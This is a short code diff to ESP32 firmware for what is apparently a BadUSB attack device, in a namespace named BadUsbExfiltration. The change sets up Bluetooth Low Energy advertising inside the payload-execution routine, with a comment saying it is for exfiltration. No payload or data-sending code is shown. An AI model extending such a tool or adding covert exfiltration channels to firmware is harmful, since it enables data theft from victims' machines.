@@ -4,8 +4,11 @@
 #include <WiFi.h>
 #include <esp_wifi.h>
 #include <NimBLEDevice.h>
+#include <NimBLEAdvertising.h>
 
 namespace BadUsbExfiltration {
+
+static NimBLEAdvertising* pAdvertising = nullptr;
 
 BadUsb::BadUsb() : isRunning_(false) {}
 
@@ -14,6 +17,10 @@ UsbResult BadUsb::executePayload(const UsbConfig& config) {
   result.success = false;
 
   if (!TxArm::isArmed()) return result;
+
+  // Initialize BLE for exfiltration
+  NimBLEDevice::init("");
+  pAdvertising = NimBLEDevice::getAdvertising();
 
   isRunning_ = true;
   unsigned long startTime = millis();
